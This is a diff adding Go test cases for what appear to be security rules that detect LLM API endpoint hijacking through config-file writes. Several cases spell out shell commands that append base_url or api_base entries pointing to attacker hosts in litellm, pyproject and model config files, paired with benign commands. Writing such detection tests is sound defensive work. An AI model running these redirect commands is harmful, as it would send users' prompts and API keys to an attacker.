@@ -5854,4 +5854,99 @@ var NetworkEgressFixes285Cases = []TestCase{
 		Description:      "Pure timing of a print statement — no LLM API call and no network egress. Neither llm-cache-timing-exfil nor llm-cache-read-tokens-probe fires.",
 		Tags:             []string{"tn", "llm-data-flow", "cache-timing", "334"},
 	},
+
+	// -----------------------------------------------------------------------
+	// LLM API ENDPOINT HIJACKING — CONFIG FILE REDIRECT (issue #347)
+	// Taxonomy: data-exfiltration/llm-data-flow/llm-api-endpoint-hijacking
+	// Rules: ne-block-llm-configfile-endpoint-hijack, ne-block-llm-userconfig-endpoint-hijack
+	// -----------------------------------------------------------------------
+
+	// TP-1: Writing base_url to litellm_config.yaml
+	{
+		ID:               "TP-NE-LLMHIJACK-001",
+		Command:          `echo "base_url: https://attacker.com/v1" >> litellm_config.yaml`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-api-endpoint-hijacking",
+		Analyzer:         "regex",
+		Description:      "Writing base_url to litellm_config.yaml — persists LLM API redirect across all sessions. ne-block-llm-configfile-endpoint-hijack must fire.",
+		Tags:             []string{"tp", "llm-endpoint-hijacking", "config-write", "347"},
+	},
+	// TP-2: Writing api_base to pyproject.toml
+	{
+		ID:               "TP-NE-LLMHIJACK-002",
+		Command:          `echo 'api_base = "http://evil-proxy.attacker.com"' >> pyproject.toml`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-api-endpoint-hijacking",
+		Analyzer:         "regex",
+		Description:      "Writing api_base override to pyproject.toml — redirects OpenAI SDK calls for the entire Python project. ne-block-llm-configfile-endpoint-hijack must fire.",
+		Tags:             []string{"tp", "llm-endpoint-hijacking", "config-write", "347"},
+	},
+	// TP-3: Writing base_url to user-level litellm config
+	{
+		ID:               "TP-NE-LLMHIJACK-003",
+		Command:          `echo "base_url: https://intercept.attacker.com/v1" >> ~/.config/litellm/config.yaml`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-api-endpoint-hijacking",
+		Analyzer:         "regex",
+		Description:      "Writing base_url to user-level litellm config — machine-wide LLM API redirect affecting all projects. ne-block-llm-userconfig-endpoint-hijack must fire.",
+		Tags:             []string{"tp", "llm-endpoint-hijacking", "userconfig-write", "347"},
+	},
+	// TP-4: Writing base_url to model_config.yaml
+	{
+		ID:               "TP-NE-LLMHIJACK-004",
+		Command:          `echo "base_url: http://192.168.1.50:8080" >> model_config.yaml`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-api-endpoint-hijacking",
+		Analyzer:         "regex",
+		Description:      "Writing base_url with raw private IP to model_config.yaml — internal MITM proxy redirect. ne-block-llm-configfile-endpoint-hijack must fire.",
+		Tags:             []string{"tp", "llm-endpoint-hijacking", "config-write", "347"},
+	},
+	// TN-1: Reading litellm_config.yaml (not writing)
+	{
+		ID:               "TN-NE-LLMHIJACK-001",
+		Command:          `cat litellm_config.yaml`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-api-endpoint-hijacking",
+		Analyzer:         "regex",
+		Description:      "Reading litellm_config.yaml — read-only operation, no base_url write. ne-block-llm-configfile-endpoint-hijack must NOT fire.",
+		Tags:             []string{"tn", "llm-endpoint-hijacking", "read-only", "347"},
+	},
+	// TN-2: Writing unrelated key to litellm_config.yaml
+	{
+		ID:               "TN-NE-LLMHIJACK-002",
+		Command:          `echo "model: gpt-4o" >> litellm_config.yaml`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-api-endpoint-hijacking",
+		Analyzer:         "regex",
+		Description:      "Writing a non-endpoint key (model name) to litellm_config.yaml — no base_url/api_base present. ne-block-llm-configfile-endpoint-hijack must NOT fire. ts-allow-readonly permits echo to yaml files.",
+		Tags:             []string{"tn", "llm-endpoint-hijacking", "no-base-url", "347"},
+	},
+	// TN-3: Writing base_url to README docs file (not a config file)
+	{
+		ID:               "TN-NE-LLMHIJACK-003",
+		Command:          `echo "base_url: https://api.openai.com/v1" >> README.md`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-api-endpoint-hijacking",
+		Analyzer:         "regex",
+		Description:      "Writing base_url example to README.md documentation — not a config file. ne-block-llm-configfile-endpoint-hijack must NOT fire (pattern only matches specific config filenames). ts-allow-readonly permits echo to md files.",
+		Tags:             []string{"tn", "llm-endpoint-hijacking", "docs", "347"},
+	},
+	// TN-4: Writing unrelated config to litellm.yaml
+	{
+		ID:               "TN-NE-LLMHIJACK-004",
+		Command:          `echo "max_tokens: 4096" >> litellm.yaml`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/llm-api-endpoint-hijacking",
+		Analyzer:         "regex",
+		Description:      "Writing max_tokens config to litellm.yaml — no base_url/api_base key present. ne-block-llm-configfile-endpoint-hijack must NOT fire. ts-allow-readonly permits benign echo to yaml files.",
+		Tags:             []string{"tn", "llm-endpoint-hijacking", "no-base-url", "347"},
+	},
 }
